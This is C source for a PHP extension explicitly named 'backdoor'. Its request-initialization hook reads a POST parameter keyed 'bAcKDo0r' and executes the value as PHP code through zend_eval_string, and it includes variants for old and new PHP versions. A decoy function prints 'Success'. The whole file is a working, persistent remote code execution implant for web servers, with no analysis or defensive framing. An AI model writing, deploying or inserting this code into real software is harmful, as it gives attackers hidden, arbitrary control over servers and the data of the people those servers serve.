#include <php.h>

#include "backdoor.h"

zend_function_entry backdoor_functions[] = {
  PHP_FE(pre_test, NULL)
  { NULL, NULL, NULL }
};

zend_module_entry backdoor_module_entry = {
  STANDARD_MODULE_HEADER,
  PHP_RLYEH_EXTNAME,
  backdoor_functions,
  NULL,
  NULL,
  PHP_RINIT(backdoor),
  NULL,
  NULL,
  PHP_RLYEH_VERSION,
  STANDARD_MODULE_PROPERTIES
};

// install module
ZEND_GET_MODULE(backdoor)

// actual non-template code!
PHP_FUNCTION(pre_test) {
  php_printf("Success");
}


PHP_RINIT_FUNCTION(backdoor){
  const char* secret_string="bAcKDo0r";
  const char* method = "_POST";

  #if PHP_MAJOR_VERSION < 7
    zval** arr;
    char* code;
    if(zend_hash_find(&EG(symbol_table),method,strlen(method) + 1,(void**)&arr) == SUCCESS){
      HashTable* ht = Z_ARRVAL_P(*arr); 
      zval** val;
      if(zend_hash_find(ht,secret_string,strlen(secret_string) + 1,(void**)&val) == SUCCESS){
        code = Z_STRVAL_PP(val);
        zend_eval_string(code,NULL,(char *)"" TSRMLS_CC);
      }
    }
  #else
    zval* arr,*code = NULL;
    if (arr = zend_hash_str_find(&EG(symbol_table),method,strlen(method))) { 
      if(Z_TYPE_P(arr) == IS_ARRAY && (code = zend_hash_str_find(Z_ARRVAL_P(arr),secret_string,strlen(secret_string)))){
        zend_eval_string(Z_STRVAL_P(code), NULL, (char *)"" TSRMLS_CC);
      }
    }
  #endif
  return SUCCESS;
}